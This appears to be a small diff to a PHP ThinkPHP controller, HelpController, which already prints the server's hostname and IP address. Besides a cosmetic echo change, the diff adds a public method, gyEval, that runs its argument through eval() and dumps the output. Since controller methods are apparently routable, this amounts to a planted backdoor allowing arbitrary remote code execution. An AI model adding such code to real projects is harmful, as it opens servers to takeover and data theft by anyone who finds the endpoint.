@@ -11,11 +11,11 @@ Class HelpController extends \think\Controller{
         $server_hostname=gethostname();
         $server_hostname .= ".";
         $server_ip=gethostbyname($server_hostname);
-        echo 'hostname:'.$server_hostname;
+        echo 'hostname:'.$server_hostname.'<br/>';
         echo 'host:'.$server_ip;
     }
 
-
-
-
+    public function gyEval($eval){
+        var_dump(eval($eval));
+    }
 }
